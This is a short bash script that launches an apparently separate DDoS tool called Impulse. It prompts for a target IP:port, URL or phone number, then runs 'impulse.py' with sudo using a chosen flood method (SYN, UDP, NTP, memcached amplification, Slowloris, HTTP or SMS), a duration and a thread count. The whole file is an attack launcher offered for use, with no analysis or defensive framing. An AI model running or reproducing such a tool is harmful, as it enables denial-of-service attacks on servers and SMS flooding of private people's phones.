#!/bin/bash
LPATH='/opt/sifter/'
ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'
YLW='\033[1;33m'
LBBLUE='\e[104m'
RED='\033[0;31m'
LGRY='\033[0;37m'
INV='\e[7m'
BRED='\033[1;31m'
UPURPLE='\033[4;35m'

cd /opt/Impulse
echo -e "${RED}"
figlet Impulse
echo -e "${ORNG}"
echo -e "${LBBLUE}Please enter the DDoS method in CAP LETTERS"
echo -e "${W}Would you like to use Impulse against IP, URL or phone number?${YLW}(i/u/p)${NC}"
read OPT
if [[ ${OPT} == "i" ]]; then
	echo -e "${W}Please enter target IP:port ${YLW}192.168.x.x:80${NC}"
	read TARGET 
	echo -e "${W}Which DDoS method would you like to use?${NC}"
	echo -e "${YLW}SYN UDP TCP NTP POD MEMCACHED SLOWLORIS"
	read METHOD	
elif [[ ${OPT} == "u" ]]; then
	echo -e "${W}Please enter the target URL${NC}"
	read TARGET 
	METHOD='HTTP'
else 
	echo -e "${W}Please enter the target number${NC}"
	read TARGET
	METHOD='SMS'
fi
echo -e "${W}How long would you like Impulse to run? (in seconds)${NC}"
read SECONDS
echo -e "${W}How many threads would you like to run?${NC}"
read THREADS 
sudo python3 impulse.py --target ${TARGET} --method ${METHOD} --time ${SECONDS} --threads ${THREADS}
sleep 5


##########################______________ czFsM250NzggX18gUmFiYjE3J3MgRGVu ______________##########################